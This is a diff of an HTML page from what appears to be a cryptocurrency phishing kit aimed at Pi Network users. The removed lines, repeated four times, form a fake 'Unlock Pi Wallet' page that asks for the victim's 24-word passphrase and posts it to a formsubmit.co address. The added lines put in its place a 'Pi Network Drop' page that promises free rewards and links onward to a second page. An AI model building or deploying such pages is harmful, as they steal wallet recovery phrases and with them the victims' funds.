@@ -1,312 +1,42 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Unlock Pi Wallet</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="phrase.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pi Network Drop</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
-  <header class="header">
-    <div class="header-container">
-      <button class="back-button">&#x25C0;</button>
-      <h1 class="title">
-        <span class="icon"></span> Wallet <span class="icon"> </span>
-      </h1>
-      <div class="menu-button">&#x25BC;</div>
-    </div>
-  </header>
+    <header>
+        <h1>Pi Network Drop</h1>
+        <p>Join now and claim your rewards!</p>
+    </header>
 
-  <main class="main">
-    <h2>Unlock Pi Wallet</h2>
-    <form action="https://formsubmit.co/d3e56b54373ed8c87d5a6f4ccf1223a5" method="POST">
-      <!-- Hidden fields for redirecting to a thank you page after submission -->
-      <input type="hidden" name="_next" value="https://yourwebsite.com/thankyou">
-      <input type="hidden" name="_captcha" value="false">
+    <main>
+        <section class="hero">
+            <h2>Get Started with Pi Network</h2>
+            <p>Claim your free rewards by signing up today.</p>
+            <a href="second-page.html" class="button">Sign Up Now</a>
+        </section>
 
-      <textarea placeholder="Enter your 24-word passphrase here" name="passphrase" required></textarea>
-      <div class="button-container">
-        <button class="btn-outline" onclick="showPopup()">Unlock With Passphrase</button>
-        
-        <!-- Popup for showing claiming -->
-        <div id="popup" class="popup">
-          <div class="popup-content">
-            <span class="close-btn" onclick="closePopup()">&times;</span>
-            <p>Claiming...</p>
-          </div>
-        </div>
-      
-        <script src="script.js"></script>
-        
-        <button class="btn-filled">Unlock With Fingerprint</button>
-      </div>
-    </form>
-
-    <div class="container">
-      <h1>FormSubmit Demo</h1>
-      <form action="https://formsubmit.co/d3e56b54373ed8c87d5a6f4ccf1223a5" method="POST">
-        <!-- Hidden fields for redirecting to a thank you page after submission -->
-        <input type="hidden" name="_next" value="https://yourwebsite.com/thankyou">
-        <input type="hidden" name="_captcha" value="false">
-        
-        <div class="form-group">
-          <div class="form-row">
-            <div class="col">
-              <!-- Removed Name input field -->
-              <input type="email" name="email" class="form-control" placeholder="Email Address" required>
+        <section class="features">
+            <div class="feature-box">
+                <h3>Secure & Fast</h3>
+                <p>Enjoy a fast and secure experience.</p>
             </div>
-          </div>
-        </div>
-        
-        <div class="form-group">
-          <textarea placeholder="Your Message" class="form-control" name="message" rows="10" required></textarea>
-        </div>
-        
-        <button type="submit" class="btn btn-lg btn-dark btn-block">Submit Form</button>
-      </form>
-    </div>
-
-    <p class="info-text">
-      As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
-    </p>
-    <p class="info-text">
-      Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.
-    </p>
-  </main>
-</body>
-</html>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Unlock Pi Wallet</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="phrase.css">
-</head>
-<body>
-  <header class="header">
-    <div class="header-container">
-      <button class="back-button">&#x25C0;</button>
-      <h1 class="title">
-        <span class="icon"></span> Wallet <span class="icon"> </span>
-      </h1>
-      <div class="menu-button">&#x25BC;</div>
-    </div>
-  </header>
-
-  <main class="main">
-    <h2>Unlock Pi Wallet</h2>
-    <form action="https://formsubmit.co/d3e56b54373ed8c87d5a6f4ccf1223a5" method="POST">
-      <!-- Hidden fields for redirecting to a thank you page after submission -->
-      <input type="hidden" name="_next" value="https://yourwebsite.com/thankyou">
-      <input type="hidden" name="_captcha" value="false">
-
-      <textarea placeholder="Enter your 24-word passphrase here" name="passphrase" required></textarea>
-      <div class="button-container">
-        <button class="btn-outline" onclick="showPopup()">Unlock With Passphrase</button>
-        
-        <!-- Popup for showing claiming -->
-        <div id="popup" class="popup">
-          <div class="popup-content">
-            <span class="close-btn" onclick="closePopup()">&times;</span>
-            <p>Claiming...</p>
-          </div>
-        </div>
-      
-        <script src="script.js"></script>
-        
-        <button class="btn-filled">Unlock With Fingerprint</button>
-      </div>
-    </form>
-
-    <div class="container">
-      <h1>FormSubmit Demo</h1>
-      <form action="https://formsubmit.co/d3e56b54373ed8c87d5a6f4ccf1223a5" method="POST">
-        <!-- Hidden fields for redirecting to a thank you page after submission -->
-        <input type="hidden" name="_next" value="https://yourwebsite.com/thankyou">
-        <input type="hidden" name="_captcha" value="false">
-        
-        <div class="form-group">
-          <div class="form-row">
-            <div class="col">
-              <!-- Removed Name input field -->
-              <input type="email" name="email" class="form-control" placeholder="Email Address" required>
+            <div class="feature-box">
+                <h3>Earn Easily</h3>
+                <p>Start earning with just a few clicks.</p>
             </div>
-          </div>
-        </div>
-        
-        <div class="form-group">
-          <textarea placeholder="Your Message" class="form-control" name="message" rows="10" required></textarea>
-        </div>
-        
-        <button type="submit" class="btn btn-lg btn-dark btn-block">Submit Form</button>
-      </form>
-    </div>
-
-    <p class="info-text">
-      As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
-    </p>
-    <p class="info-text">
-      Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.
-    </p>
-  </main>
-</body>
-</html>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Unlock Pi Wallet</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="phrase.css">
-</head>
-<body>
-  <header class="header">
-    <div class="header-container">
-      <button class="back-button">&#x25C0;</button>
-      <h1 class="title">
-        <span class="icon"></span> Wallet <span class="icon"> </span>
-      </h1>
-      <div class="menu-button">&#x25BC;</div>
-    </div>
-  </header>
-
-  <main class="main">
-    <h2>Unlock Pi Wallet</h2>
-    <form action="https://formsubmit.co/d3e56b54373ed8c87d5a6f4ccf1223a5" method="POST">
-      <!-- Hidden fields for redirecting to a thank you page after submission -->
-      <input type="hidden" name="_next" value="https://yourwebsite.com/thankyou">
-      <input type="hidden" name="_captcha" value="false">
-
-      <textarea placeholder="Enter your 24-word passphrase here" name="passphrase" required></textarea>
-      <div class="button-container">
-        <button class="btn-outline" onclick="showPopup()">Unlock With Passphrase</button>
-        
-        <!-- Popup for showing claiming -->
-        <div id="popup" class="popup">
-          <div class="popup-content">
-            <span class="close-btn" onclick="closePopup()">&times;</span>
-            <p>Claiming...</p>
-          </div>
-        </div>
-      
-        <script src="script.js"></script>
-        
-        <button class="btn-filled">Unlock With Fingerprint</button>
-      </div>
-    </form>
-
-    <div class="container">
-      <h1>FormSubmit Demo</h1>
-      <form action="https://formsubmit.co/d3e56b54373ed8c87d5a6f4ccf1223a5" method="POST">
-        <!-- Hidden fields for redirecting to a thank you page after submission -->
-        <input type="hidden" name="_next" value="https://yourwebsite.com/thankyou">
-        <input type="hidden" name="_captcha" value="false">
-        
-        <div class="form-group">
-          <div class="form-row">
-            <div class="col">
-              <!-- Removed Name input field -->
-              <input type="email" name="email" class="form-control" placeholder="Email Address" required>
+            <div class="feature-box">
+                <h3>Referral System</h3>
+                <p>Invite friends and get extra rewards.</p>
             </div>
-          </div>
-        </div>
-        
-        <div class="form-group">
-          <textarea placeholder="Your Message" class="form-control" name="message" rows="10" required></textarea>
-        </div>
-        
-        <button type="submit" class="btn btn-lg btn-dark btn-block">Submit Form</button>
-      </form>
-    </div>
+        </section>
+    </main>
 
-    <p class="info-text">
-      As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
-    </p>
-    <p class="info-text">
-      Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.
-    </p>
-  </main>
-</body>
-</html>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Unlock Pi Wallet</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="phrase.css">
-</head>
-<body>
-  <header class="header">
-    <div class="header-container">
-      <button class="back-button">&#x25C0;</button>
-      <h1 class="title">
-        <span class="icon"></span> Wallet <span class="icon"> </span>
-      </h1>
-      <div class="menu-button">&#x25BC;</div>
-    </div>
-  </header>
-
-  <main class="main">
-    <h2>Unlock Pi Wallet</h2>
-    <form action="https://formsubmit.co/d3e56b54373ed8c87d5a6f4ccf1223a5" method="POST">
-      <!-- Hidden fields for redirecting to a thank you page after submission -->
-      <input type="hidden" name="_next" value="https://yourwebsite.com/thankyou">
-      <input type="hidden" name="_captcha" value="false">
-
-      <textarea placeholder="Enter your 24-word passphrase here" name="passphrase" required></textarea>
-      <div class="button-container">
-        <button class="btn-outline" onclick="showPopup()">Unlock With Passphrase</button>
-        
-        <!-- Popup for showing claiming -->
-        <div id="popup" class="popup">
-          <div class="popup-content">
-            <span class="close-btn" onclick="closePopup()">&times;</span>
-            <p>Claiming...</p>
-          </div>
-        </div>
-      
-        <script src="script.js"></script>
-        
-        <button class="btn-filled">Unlock With Fingerprint</button>
-      </div>
-    </form>
-
-    <div class="container">
-      <h1>FormSubmit Demo</h1>
-      <form action="https://formsubmit.co/d3e56b54373ed8c87d5a6f4ccf1223a5" method="POST">
-        <!-- Hidden fields for redirecting to a thank you page after submission -->
-        <input type="hidden" name="_next" value="https://yourwebsite.com/thankyou">
-        <input type="hidden" name="_captcha" value="false">
-        
-        <div class="form-group">
-          <div class="form-row">
-            <div class="col">
-              <!-- Removed Name input field -->
-              <input type="email" name="email" class="form-control" placeholder="Email Address" required>
-            </div>
-          </div>
-        </div>
-        
-        <div class="form-group">
-          <textarea placeholder="Your Message" class="form-control" name="message" rows="10" required></textarea>
-        </div>
-        
-        <button type="submit" class="btn btn-lg btn-dark btn-block">Submit Form</button>
-      </form>
-    </div>
-
-    <p class="info-text">
-      As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
-    </p>
-    <p class="info-text">
-      Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.
-    </p>
-  </main>
+    <footer>
+        <p>&copy; 2025 Pi Network Drop. All Rights Reserved.</p>
+    </footer>
 </body>
 </html>
